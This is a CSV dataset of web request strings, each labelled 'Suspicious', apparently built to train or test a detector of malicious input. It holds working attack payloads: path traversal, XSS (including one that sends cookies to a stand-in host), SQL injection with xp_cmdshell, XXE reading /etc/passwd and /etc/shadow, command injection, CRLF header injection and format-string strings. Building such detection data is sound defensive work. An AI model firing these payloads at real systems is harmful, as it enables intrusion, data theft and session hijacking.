WebString,Label
\..\..\..\..\..\..\..\..\..\..\boot.ini,Suspicious
..\..\..\..\..\..\..\..\..\..\boot.ini%00,Suspicious
..\..\..\..\..\..\..\..\..\..\boot.ini,Suspicious
/../../../../../../../../../../../boot.ini%00.html,Suspicious
/../../../../../../../../../../../boot.ini%00.jpg,Suspicious
/.../.../.../.../.../,Suspicious
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,Suspicious
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,Suspicious
%0d%0aX-Injection-Header:%20AttackValue,Suspicious
!@#0%^#0##018387@#0^^**((),Suspicious
%01%02%03%04%0a%0d%0aADSF,Suspicious
"/,%ENV,/",Suspicious
&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;,Suspicious
&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;,Suspicious
%,Suspicious
#,Suspicious
*,Suspicious
},Suspicious
;,Suspicious
/,Suspicious
\,Suspicious
\\,Suspicious
\\/,Suspicious
\\\\*,Suspicious
\\\\?\\,Suspicious
&lt,Suspicious
&lt;,Suspicious
&LT,Suspicious
&LT;,Suspicious
<,Suspicious
<<,Suspicious
<<<,Suspicious
|,Suspicious
||,Suspicious
`,Suspicious
-,Suspicious
--,Suspicious
*|,Suspicious
^',Suspicious
\',Suspicious
/',Suspicious
@',Suspicious
('),Suspicious
{'},Suspicious
['],Suspicious
*',Suspicious
#',Suspicious
!',Suspicious
!@#$%%^#$%#$@#$%$$@#$%^^**((),Suspicious
%01%02%03%04%0a%0d%0aADSF,Suspicious
\t,Suspicious
"""\t""",Suspicious
&#10;,Suspicious
&#13;,Suspicious
&#10;&#13;,Suspicious
&#13;&#10;,Suspicious
#xD,Suspicious
#xA,Suspicious
#xD#xA,Suspicious
#xA#xD,Suspicious
/%00/,Suspicious
%00/,Suspicious
0%,Suspicious
<?,Suspicious
%3C,Suspicious
%3C%3F,Suspicious
60%,Suspicious
%5C,Suspicious
%5C/,Suspicious
%7C,Suspicious
0%,Suspicious
/%2A,Suspicious
%2A,Suspicious
%2C,Suspicious
20%,Suspicious
%20|,Suspicious
%250a,Suspicious
2500%,Suspicious
../,Suspicious
%2e%2e%2f,Suspicious
..%u2215,Suspicious
..%c0%af,Suspicious
..%bg%qf,Suspicious
..\,Suspicious
..%5c,Suspicious
..%%35c,Suspicious
..%255c,Suspicious
..%%35%63,Suspicious
..%25%35%63,Suspicious
..%u2216,Suspicious
&#60,Suspicious
&#060,Suspicious
&#0060,Suspicious
&#00060,Suspicious
&#000060,Suspicious
&#0000060,Suspicious
&#60;,Suspicious
&#060;,Suspicious
&#0060;,Suspicious
&#00060;,Suspicious
&#000060;,Suspicious
&#0000060;,Suspicious
&#x3c,Suspicious
&#x03c,Suspicious
&#x003c,Suspicious
&#x0003c,Suspicious
&#x00003c,Suspicious
&#x000003c,Suspicious
&#x3c;,Suspicious
&#x03c;,Suspicious
&#x003c;,Suspicious
&#x0003c;,Suspicious
&#x00003c;,Suspicious
&#x000003c;,Suspicious
&#X3c,Suspicious
&#X03c,Suspicious
&#X003c,Suspicious
&#X0003c,Suspicious
&#X00003c,Suspicious
&#X000003c,Suspicious
&#X3c;,Suspicious
&#X03c;,Suspicious
&#X003c;,Suspicious
&#X0003c;,Suspicious
&#X00003c;,Suspicious
&#X000003c;,Suspicious
&#x3C,Suspicious
&#x03C,Suspicious
&#x003C,Suspicious
&#x0003C,Suspicious
&#x00003C,Suspicious
&#x000003C,Suspicious
&#x3C;,Suspicious
&#x03C;,Suspicious
&#x003C;,Suspicious
&#x0003C;,Suspicious
&#x00003C;,Suspicious
&#x000003C;,Suspicious
&#X3C,Suspicious
&#X03C,Suspicious
&#X003C,Suspicious
&#X0003C,Suspicious
&#X00003C,Suspicious
&#X000003C,Suspicious
&#X3C;,Suspicious
&#X03C;,Suspicious
&#X003C;,Suspicious
&#X0003C;,Suspicious
&#X00003C;,Suspicious
&#X000003C;,Suspicious
\x3c,Suspicious
\x3C,Suspicious
\u003c,Suspicious
\u003C,Suspicious
something%00html,Suspicious
&apos;,Suspicious
/&apos;,Suspicious
\&apos;,Suspicious
^&apos;,Suspicious
@&apos;,Suspicious
{&apos;},Suspicious
[&apos;],Suspicious
*&apos;,Suspicious
#&apos;,Suspicious
""">xxx<P>yyy",Suspicious
"""><script>""",Suspicious
"<script>alert(""XSS"")</script>",Suspicious
"<<script>alert(""XSS"");//<</script>",Suspicious
<script>alert(document.cookie)</script>,Suspicious
'><script>alert(document.cookie)</script>,Suspicious
'><script>alert(document.cookie);</script>,Suspicious
"\"";alert('XSS');//",Suspicious
"%3cscript%3ealert(""XSS"");%3c/script%3e",Suspicious
%3cscript%3ealert(document.cookie);%3c%2fscript%3e,Suspicious
%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E,Suspicious
&ltscript&gtalert(document.cookie);</script>,Suspicious
&ltscript&gtalert(document.cookie);&ltscript&gtalert,Suspicious
<xss><script>alert('XSS')</script></vulnerable>,Suspicious
<IMG%20SRC='javascript:alert(document.cookie)'>,Suspicious
"<IMG SRC=""javascript:alert('XSS');"">",Suspicious
"<IMG SRC=""javascript:alert('XSS')""",Suspicious
<IMG SRC=javascript:alert('XSS')>,Suspicious
<IMG SRC=JaVaScRiPt:alert('XSS')>,Suspicious
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,Suspicious
"<IMG SRC=`javascript:alert(""'XSS'"")`>",Suspicious
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",Suspicious
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",Suspicious
<IMG%20SRC='javasc      ript:alert(document.cookie)'>,Suspicious
"<IMG SRC=""jav   ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",Suspicious
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",Suspicious
"<IMG DYNSRC=""javascript:alert('XSS')"">",Suspicious
"<IMG LOWSRC=""javascript:alert('XSS')"">",Suspicious
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>,Suspicious
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,Suspicious
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,Suspicious
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,Suspicious
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,Suspicious
"""><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>",Suspicious
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E,Suspicious
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",Suspicious
"'';!--""<XSS>=&{()}",Suspicious
,Suspicious
',Suspicious
"""",Suspicious
#,Suspicious
-,Suspicious
--,Suspicious
' --,Suspicious
--';,Suspicious
' ;,Suspicious
= ',Suspicious
= ;,Suspicious
= --,Suspicious
\x23,Suspicious
\x27,Suspicious
\x3D \x3B',Suspicious
\x3D \x27,Suspicious
\x27\x4F\x52 SELECT *,Suspicious
\x27\x6F\x72 SELECT *,Suspicious
'or select *,Suspicious
admin'--,Suspicious
';shutdown--,Suspicious
"<>""'%;)(&+",Suspicious
' or ''=',Suspicious
' or 'x'='x,Suspicious
""" or ""x""=""x",Suspicious
') or ('x'='x,Suspicious
0 or 1=1,Suspicious
' or 0=0 --,Suspicious
""" or 0=0 --",Suspicious
or 0=0 --,Suspicious
' or 0=0 #,Suspicious
""" or 0=0 #",Suspicious
or 0=0 #,Suspicious
' or 1=1--,Suspicious
""" or 1=1--",Suspicious
' or '1'='1'--,Suspicious
"""' or 1 --'""",Suspicious
or 1=1--,Suspicious
or%201=1,Suspicious
or%201=1 --,Suspicious
' or 1=1 or ''=',Suspicious
""" or 1=1 or """"=""",Suspicious
' or a=a--,Suspicious
""" or ""a""=""a",Suspicious
') or ('a'='a,Suspicious
""") or (""a""=""a",Suspicious
"hi"" or ""a""=""a",Suspicious
"hi"" or 1=1 --",Suspicious
hi' or 1=1 --,Suspicious
hi' or 'a'='a,Suspicious
hi') or ('a'='a,Suspicious
"hi"") or (""a""=""a",Suspicious
'hi' or 'x'='x';,Suspicious
@variable,Suspicious
",@variable",Suspicious
PRINT,Suspicious
PRINT @@variable,Suspicious
select,Suspicious
insert,Suspicious
as,Suspicious
or,Suspicious
procedure,Suspicious
limit,Suspicious
order by,Suspicious
asc,Suspicious
desc,Suspicious
delete,Suspicious
update,Suspicious
distinct,Suspicious
having,Suspicious
truncate,Suspicious
replace,Suspicious
like,Suspicious
handler,Suspicious
bfilename,Suspicious
' or username like '%,Suspicious
' or uname like '%,Suspicious
' or userid like '%,Suspicious
' or uid like '%,Suspicious
' or user like '%,Suspicious
exec xp,Suspicious
exec sp,Suspicious
'; exec master..xp_cmdshell,Suspicious
'; exec xp_regread,Suspicious
t'exec master..xp_cmdshell 'nslookup www.google.com'--,Suspicious
--sp_password,Suspicious
\x27UNION SELECT,Suspicious
' UNION SELECT,Suspicious
' UNION ALL SELECT,Suspicious
' or (EXISTS),Suspicious
' (select top 1,Suspicious
'||UTL_HTTP.REQUEST,Suspicious
1;SELECT%20*,Suspicious
to_timestamp_tz,Suspicious
tz_offset,Suspicious
&lt;&gt;&quot;'%;)(&amp;+,Suspicious
'%20or%201=1,Suspicious
%27%20or%201=1,Suspicious
%20$(sleep%2050),Suspicious
%20'sleep%2050',Suspicious
char%4039%41%2b%40SELECT,Suspicious
&apos;%20OR,Suspicious
'sqlattempt1,Suspicious
(sqlattempt2),Suspicious
|,Suspicious
%7C,Suspicious
*|,Suspicious
%2A%7C,Suspicious
*(|(mail=*)),Suspicious
%2A%28%7C%28mail%3D%2A%29%29,Suspicious
*(|(objectclass=*)),Suspicious
%2A%28%7C%28objectclass%3D%2A%29%29,Suspicious
(,Suspicious
28%,Suspicious
),Suspicious
29%,Suspicious
&,Suspicious
26%,Suspicious
!,Suspicious
21%,Suspicious
' or 1=1 or ''=',Suspicious
' or ''=',Suspicious
x' or 1=1 or 'x'='y,Suspicious
/,Suspicious
//,Suspicious
//*,Suspicious
*/*,Suspicious
@*,Suspicious
count(/child::node()),Suspicious
x' or name()='username' or 'x'='y,Suspicious
"<name>','')); phpinfo(); exit;/*</name>",Suspicious
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,Suspicious
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",Suspicious
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",Suspicious
"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",Suspicious
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",Suspicious
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",Suspicious
,Suspicious
',Suspicious
'--,Suspicious
' or 1=1--,Suspicious
1 or 1=1--,Suspicious
' or 1 in (@@version)--,Suspicious
1 or 1 in (@@version)--,Suspicious
'; waitfor delay '0:30:0'--,Suspicious
1; waitfor delay '0:30:0'--,Suspicious
'||Utl_Http.request('http://<yourservername>') from dual--,Suspicious
1||Utl_Http.request('http://<yourservername>') from dual--,Suspicious
xsstest,Suspicious
"xsstest%00""<>'",Suspicious
</foo>,Suspicious
<foo></foo>,Suspicious
)))))))))),Suspicious
../../../../../../../../../../boot.ini,Suspicious
..\..\..\..\..\..\..\..\..\..\boot.ini,Suspicious
../../../../../../../../../../windows/win.ini,Suspicious
..\..\..\..\..\..\..\..\..\..\windows\win.ini,Suspicious
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &,Suspicious
| ping -i 30 127.0.0.1 |,Suspicious
| ping -n 30 127.0.0.1 |,Suspicious
& ping -i 30 127.0.0.1 &,Suspicious
& ping -n 30 127.0.0.1 &,Suspicious
; ping 127.0.0.1 ;,Suspicious
%0a ping -i 30 127.0.0.1 %0a,Suspicious
`ping 127.0.0.1`,Suspicious
;echo 111111,Suspicious
echo 111111,Suspicious
response.write 111111,Suspicious
:response.write 111111,Suspicious
http://<yourservername>/,Suspicious
<youremail>%0aCc:<youremail>,Suspicious
<youremail>%0d%0aCc:<youremail>,Suspicious
<youremail>%0aBcc:<youremail>,Suspicious
<youremail>%0d%0aBcc:<youremail>,Suspicious
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a,Suspicious
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a,Suspicious
"# known cross platform source Code, file disclosure attack patterns - append after file or dir path",Suspicious
70%,Suspicious
.%E2%73%70,Suspicious
2.00E-02,Suspicious
%2e,Suspicious
.,Suspicious
\,Suspicious
?*,Suspicious
20%,Suspicious
0%,Suspicious
%2f,Suspicious
%5c,Suspicious
count(/child::node()),Suspicious
x' or name()='username' or 'x'='y,Suspicious
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,Suspicious
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><foo><![CDATA[' or 1=1 or ''=']]></foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file://c:/boot.ini"""">]><foo>&xxe;</foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////etc/passwd"""">]><foo>&xxe;</foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////etc/shadow"""">]><foo>&xxe;</foo>""",Suspicious
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////dev/random"""">]><foo>&xxe;</foo>""",Suspicious
"""<xml ID=I><X><C><![CDATA[<IMG SRC=""""javas]]><![CDATA[cript:alert('XSS');"""">]]>""",Suspicious
"""<xml ID=""""xss""""><I><B><IMG SRC=""""javas<!-- -->cript:alert('XSS')""""></B></I></xml><SPAN DATASRC=""""#xss"""" DATAFLD=""""B"""" DATAFORMATAS=""""HTML""""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",Suspicious
"""<xml SRC=""""xsstest.xml"""" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",Suspicious
"""<HTML xmlns:xss><?import namespace=""""xss"""" implementation=""""http://ha.ckers.org/xss.htc""""><xss:xss>XSS</xss:xss></HTML>""",Suspicious
0%,Suspicious
NULL,Suspicious
null,Suspicious
',Suspicious
"""",Suspicious
;,Suspicious
<!,Suspicious
-,Suspicious
=,Suspicious
+,Suspicious
"""",Suspicious
&,Suspicious
!,Suspicious
|,Suspicious
<,Suspicious
>,Suspicious
"""><script>alert(1)</script>",Suspicious
%0d,Suspicious
%0a,Suspicious
%7f,Suspicious
%ff,Suspicious
-1,Suspicious
other,Suspicious
%s%p%x%d,Suspicious
%99999999999s,Suspicious
%08x,Suspicious
%20d,Suspicious
%20n,Suspicious
%20x,Suspicious
%20s,Suspicious
%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d ,Suspicious
%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i,Suspicious
%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o,Suspicious
%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u,Suspicious
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x,Suspicious
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X,Suspicious
%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a,Suspicious
%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A,Suspicious
%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e,Suspicious
%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E,Suspicious
%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f,Suspicious
%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F,Suspicious
%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g,Suspicious
%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G,Suspicious
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s,Suspicious
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p,Suspicious
%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%,Suspicious
XXXXX.%p,Suspicious
"XXXXX`perl -e 'print "".%p"" x 80'`",Suspicious
"`perl -e 'print "".%p"" x 80'`%n",Suspicious
%0AHeader-Test:BLATRUC,Suspicious
%0A%20Header-Test:BLATRUC,Suspicious
%20%0AHeader-Test:BLATRUC,Suspicious
%23%OAHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC,Suspicious
%3F%0AHeader-Test:BLATRUC,Suspicious
crlf%0AHeader-Test:BLATRUC,Suspicious
crlf%0A%20Header-Test:BLATRUC,Suspicious
crlf%20%0AHeader-Test:BLATRUC,Suspicious
crlf%23%OAHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC,Suspicious
crlf%3F%0AHeader-Test:BLATRUC,Suspicious
%0DHeader-Test:BLATRUC,Suspicious
%0D%20Header-Test:BLATRUC,Suspicious
%20%0DHeader-Test:BLATRUC,Suspicious
%23%0DHeader-Test:BLATRUC,Suspicious
%23%0AHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC,Suspicious
%3F%0DHeader-Test:BLATRUC,Suspicious
crlf%0DHeader-Test:BLATRUC,Suspicious
crlf%0D%20Header-Test:BLATRUC,Suspicious
crlf%20%0DHeader-Test:BLATRUC,Suspicious
crlf%23%0DHeader-Test:BLATRUC,Suspicious
crlf%23%0AHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC,Suspicious
crlf%3F%0DHeader-Test:BLATRUC,Suspicious
%0D%0AHeader-Test:BLATRUC,Suspicious
%0D%0A%20Header-Test:BLATRUC,Suspicious
%20%0D%0AHeader-Test:BLATRUC,Suspicious
%23%0D%0AHeader-Test:BLATRUC,Suspicious
\r\nHeader-Test:BLATRUC,Suspicious
 \r\n Header-Test:BLATRUC,Suspicious
\r\n Header-Test:BLATRUC,Suspicious
%5cr%5cnHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC,Suspicious
%3F%0D%0AHeader-Test:BLATRUC,Suspicious
crlf%0D%0AHeader-Test:BLATRUC,Suspicious
crlf%0D%0A%20Header-Test:BLATRUC,Suspicious
crlf%20%0D%0AHeader-Test:BLATRUC,Suspicious
crlf%23%0D%0AHeader-Test:BLATRUC,Suspicious
crlf\r\nHeader-Test:BLATRUC,Suspicious
crlf%5cr%5cnHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,Suspicious
crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC,Suspicious
crlf%3F%0D%0AHeader-Test:BLATRUC,Suspicious
%0D%0A%09Header-Test:BLATRUC,Suspicious
crlf%0D%0A%09Header-Test:BLATRUC,Suspicious
%250AHeader-Test:BLATRUC,Suspicious
%25250AHeader-Test:BLATRUC,Suspicious
%%0A0AHeader-Test:BLATRUC,Suspicious
%25%30AHeader-Test:BLATRUC,Suspicious
%25%30%61Header-Test:BLATRUC,Suspicious
%u000AHeader-Test:BLATRUC,Suspicious
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC,Suspicious
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC,Suspicious
/google.com/%2F..%0D%0AHeader-Test:BLATRUC,Suspicious
"""-prompt(8)-""",Suspicious
'-prompt(8)-',Suspicious
""";a=prompt,a()//",Suspicious
"';a=prompt,a()//",Suspicious
"'-eval(""window['pro'%2B'mpt'](8)"")-'",Suspicious
"""-eval(""window['pro'%2B'mpt'](8)"")-""",Suspicious
"""onclick=prompt(8)>""@x.y",Suspicious
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",Suspicious
<image/src/onerror=prompt(8)>,Suspicious
<img/src/onerror=prompt(8)>,Suspicious
<image src/onerror=prompt(8)>,Suspicious
<img src/onerror=prompt(8)>,Suspicious
<image src =q onerror=prompt(8)>,Suspicious
<img src =q onerror=prompt(8)>,Suspicious
</scrip</script>t><img src =q onerror=prompt(8)>,Suspicious
<svg onload=alert(1)>,Suspicious
"""><svg onload=alert(1)//",Suspicious
"""onmouseover=alert(1)//",Suspicious
"""autofocus/onfocus=alert(1)//",Suspicious
'-alert(1)-',Suspicious
'-alert(1)//,Suspicious
\'-alert(1)//,Suspicious
</script><svg onload=alert(1)>,Suspicious
<x contenteditable onblur=alert(1)>lose focus! ,Suspicious
<x onclick=alert(1)>click this! ,Suspicious
<x oncopy=alert(1)>copy this! ,Suspicious
<x oncontextmenu=alert(1)>right click this! ,Suspicious
<x oncut=alert(1)>copy this! ,Suspicious
<x ondblclick=alert(1)>double click this! ,Suspicious
<x ondrag=alert(1)>drag this! ,Suspicious
<x contenteditable onfocus=alert(1)>focus this! ,Suspicious
<x contenteditable oninput=alert(1)>input here! ,Suspicious
<x contenteditable onkeydown=alert(1)>press any key! ,Suspicious
